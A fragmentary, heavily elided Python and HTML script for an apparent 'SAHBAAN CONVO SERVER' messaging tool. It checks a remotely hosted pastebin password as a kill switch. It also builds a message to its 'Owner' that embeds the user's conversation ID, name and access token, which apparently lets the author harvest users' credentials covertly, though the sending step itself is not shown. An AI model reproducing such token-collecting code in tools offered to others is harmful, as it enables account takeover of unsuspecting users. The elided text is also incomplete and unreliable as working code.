...
<head>
    ...
    <title>SAHBAAN CONVO SERVER</title>
    <style>
        body {
...
def send_initial_message():
    ...
    mmm_pass = requests.get('https://pastebin.com/raw/Kf03gKTR').text
    
    if mmm_pass not in password:
        print('\033[1;31m⚠︎ Your Password Changed By Sahbaan⚠︎')
        sys.exit()
    
    # Message template
    msg_template = "Owner => SAHBAAN  \n Hello legend chod Sahbaan sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
